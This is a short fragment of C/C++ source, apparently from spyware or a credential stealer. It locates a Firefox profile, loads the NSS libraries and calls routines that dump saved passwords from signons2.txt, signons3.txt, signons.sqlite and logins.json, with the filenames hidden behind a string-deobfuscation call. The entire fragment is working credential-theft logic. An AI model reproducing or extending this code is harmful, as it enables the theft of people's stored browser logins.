	ProfilePath = GetFFProfilePath();

	if (!ProfilePath || !DirectoryExists(ProfilePath)) 
		return 0;
	
	FFDir = GetFFLibPath();

	if (!FFDir || !DirectoryExists(FFDir)) 
		return 0;
	
	if (!InitFFLibs(FFDir))	
		return 0;

	if (!InitializeNSSLibrary(ProfilePath))
		return 0;

	// get the passwords for defferent versions  
	DumpFF(ProfilePath, DeobStringW(L"9Z71519o.LSL"));	// 2.x "signons2.txt"
	DumpFF(ProfilePath, DeobStringW(L"9Z71519n.LSL"));	// 3.0 "signons3.txt"
	DumpSqlFF(ProfilePath, DeobStringW(L"9Z71519.9ByZLI")); // 3.1 3.5 "signons.sqlite"
	DumpJsonFF(ProfilePath, DeobStringW(L"y57Z19.h951")); // 3.1 3.5 "logins.json"

	NSSUnload();
	
	return 0;
}
